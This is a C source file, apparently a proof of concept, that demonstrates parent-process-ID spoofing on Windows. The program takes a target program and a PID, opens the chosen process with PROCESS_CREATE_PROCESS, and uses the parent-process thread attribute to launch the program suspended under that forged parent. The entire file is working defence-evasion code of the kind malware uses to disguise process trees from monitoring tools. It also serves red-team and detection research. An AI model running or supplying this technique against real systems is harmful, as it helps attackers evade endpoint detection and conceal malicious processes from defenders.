// POC to demonstrate PPID spoofing
// If compiling with cl.exe: cl /DUNICODE /D_UNICODE ppid_spoof.c

#include <Windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
	if (argc != 3) {
		printf("Usage: %s [program] [ppid]\n", argv[0]);
		printf("Example: %s notepad.exe 3831\n", argv[0]);
		return 1;
	}

	DWORD ppid = strtoul(argv[2], NULL, 0);
	printf("[+] Spoofing parent PID: %u\n", ppid);

	// Open a handle to the process we want to spoof as our parent process
	// this requires the 'PROCESS_CREATE_PROCESS' access mask
	HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, ppid);

	if (!hParent) {
		printf("[-] Error obtaining a handle to parent process: %u", GetLastError());
		return 1;
	}

	SIZE_T size;

	// The first time we call this function is only to populate 'size' 
	InitializeProcThreadAttributeList(NULL, 1, 0, &size);

	// ALlocate memory for our attribute list
	// we got the correct size from our initial call to InitializeProcThreadAttributeList
	VOID* buffer = malloc(size);  // Don't forget to free this memory
	PPROC_THREAD_ATTRIBUTE_LIST attributes = (PPROC_THREAD_ATTRIBUTE_LIST)buffer;

	InitializeProcThreadAttributeList(attributes, 1, 0, &size);

	// Adding an attribute to change the parent process to hParent
	UpdateProcThreadAttribute(attributes, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		&hParent, sizeof(hParent), NULL, NULL);

	WCHAR cmdline[MAX_PATH];
	swprintf(cmdline, MAX_PATH, L"%hs", argv[1]);   // convert char* -> WCHAR*

	STARTUPINFOEX si = { sizeof(si) };  // initialize the first member with the struct size
	si.lpAttributeList = attributes;
	PROCESS_INFORMATION pi;  // output parameter - no need to initialize

	// Create a process with a spoofed parent process (hParent)
	BOOL created = CreateProcess(NULL, cmdline, NULL, NULL,
		FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL, (STARTUPINFO*)&si, &pi);

	if (created) {
		printf("[+] Process created! New PID: %u (Parent: %u)\n", pi.dwProcessId, ppid);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	else {
		printf("[-] CreateProcess failed: %u\n", GetLastError());
	}

	// Cleanup
	CloseHandle(hParent);
	DeleteProcThreadAttributeList(attributes);
	free(buffer);

	return created ? 0 : 1;

}
